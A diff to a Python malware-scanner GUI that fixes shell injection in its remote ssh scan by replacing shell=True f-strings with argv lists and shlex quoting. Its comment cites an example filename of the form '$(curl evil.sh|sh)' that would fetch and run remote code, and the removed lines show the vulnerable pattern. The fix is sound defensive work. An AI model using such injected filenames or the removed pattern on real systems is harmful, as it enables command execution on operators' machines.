@@ -5,6 +5,7 @@
 eVirusTower — Lightweight malware scanner with hash + pattern detection.
 """
 import os
+import shlex
 import hashlib
 import threading
 import tkinter as tk
@@ -46,6 +47,55 @@ SUSPICIOUS_PATTERNS = [
 ]
 
 MAX_SCAN_SIZE = 50_000_000  # 50 MB
+
+
+# ── Remote scan command builders ────────────────────────────────────────
+#
+# Security note: these used to be built as f-strings and run with
+# subprocess.run(cmd, shell=True, ...). host/user/port/rpath/depth all come
+# from unrestricted GUI text fields, so any of them containing shell
+# metacharacters (;, backticks, $(...), an unescaped ") was interpreted by
+# the LOCAL shell during that subprocess.run call, before ssh was even
+# invoked -- arbitrary local command execution just from typing into the
+# "Remote Path" or "Max Depth" fields. Worse, the per-file cat command
+# embedded fpath the same way, and fpath is not operator input at all: it's
+# a filename read back from `find`'s own output on whatever remote host is
+# being scanned. A file merely NAMED something like "$(curl evil.sh|sh)" on
+# the scanned machine would run that command on the operator's own laptop
+# the moment a remote scan reached it, with no further interaction needed.
+#
+# Passing an argv list to subprocess.run() (instead of a single string with
+# shell=True) means no local shell is ever involved, so none of these
+# values can be reinterpreted as local shell syntax, no matter what they
+# contain. rpath/depth/fpath are still shell-quoted with shlex.quote() when
+# building the *remote* command string ssh sends over, since ssh always
+# hands that string to a shell on the remote end -- that's inherent to how
+# ssh invokes a remote command and isn't something an argv list on the
+# local side can avoid. Quoting them properly also fixes remote paths or
+# filenames containing spaces, which the old code mishandled anyway.
+
+def _build_remote_find_cmd(host, user, port, rpath, depth):
+    """Argv list (no local shell) that lists files on a remote host over ssh."""
+    remote_cmd = "find {} -maxdepth {} -type f -size -50M 2>/dev/null".format(
+        shlex.quote(rpath), shlex.quote(str(depth))
+    )
+    return [
+        "ssh", "-p", str(port),
+        "-o", "ConnectTimeout=10",
+        "-o", "StrictHostKeyChecking=no",
+        f"{user}@{host}",
+        remote_cmd,
+    ]
+
+
+def _build_remote_cat_cmd(host, user, port, fpath):
+    """Argv list (no local shell) that reads one remote file's content over ssh."""
+    remote_cmd = "cat {}".format(shlex.quote(fpath))
+    return [
+        "ssh", "-p", str(port),
+        f"{user}@{host}",
+        remote_cmd,
+    ]
 
 
 # ── GUI Scanner Widget ────────────────────────────────────────────────
@@ -352,9 +402,9 @@ class EVirusTower(ttk.Frame):
         def worker():
             try:
                 # List remote files
-                cmd = f'ssh -p {port} -o ConnectTimeout=10 -o StrictHostKeyChecking=no {user}@{host} "find {rpath} -maxdepth {depth} -type f -size -50M 2>/dev/null"'
-                self._log_msg(f"$ {cmd}")
-                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
+                cmd = _build_remote_find_cmd(host, user, port, rpath, depth)
+                self._log_msg(f"$ {' '.join(shlex.quote(c) for c in cmd)}")
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
 
                 if result.returncode != 0:
                     self._log_msg(f"SSH error: {result.stderr.strip()}")
@@ -377,9 +427,12 @@ class EVirusTower(ttk.Frame):
 
                     # For small text files, check content patterns
                     if ext.lower() in (".bat", ".cmd", ".vbs", ".ps1", ".sh", ".py"):
-                        cat_cmd = f'ssh -p {port} {user}@{host} "cat \'{fpath}\'" 2>/dev/null'
+                        cat_cmd = _build_remote_cat_cmd(host, user, port, fpath)
                         try:
-                            cat_result = subprocess.run(cat_cmd, shell=True, capture_output=True, timeout=10)
+                            cat_result = subprocess.run(
+                                cat_cmd, stdout=subprocess.PIPE,
+                                stderr=subprocess.DEVNULL, timeout=10,
+                            )
                             if cat_result.returncode == 0:
                                 data = cat_result.stdout
                                 # Hash check
